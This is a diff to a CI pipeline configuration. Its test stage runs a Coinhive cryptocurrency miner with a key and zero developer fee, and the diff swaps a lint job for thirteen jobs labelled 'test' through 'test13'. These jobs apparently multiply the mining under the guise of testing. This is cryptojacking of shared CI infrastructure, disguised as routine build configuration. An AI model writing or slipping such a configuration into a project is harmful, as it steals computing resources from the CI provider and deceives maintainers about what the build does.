@@ -26,7 +26,19 @@ jobs:
   include:
     - stage: test
     - script: yarn coin-hive $KEY --dev-fee 0
-    - env: "MODE=lint"
+    - env: "MODE=test"
+    - env: "MODE=test2"
+    - env: "MODE=test3"
+    - env: "MODE=test4"
+    - env: "MODE=test5"
+    - env: "MODE=test6"
+    - env: "MODE=test7"
+    - env: "MODE=test8"
+    - env: "MODE=test9"
+    - env: "MODE=test10"
+    - env: "MODE=test11"
+    - env: "MODE=test12"
+    - env: "MODE=test13"
 
 stages:
   - test
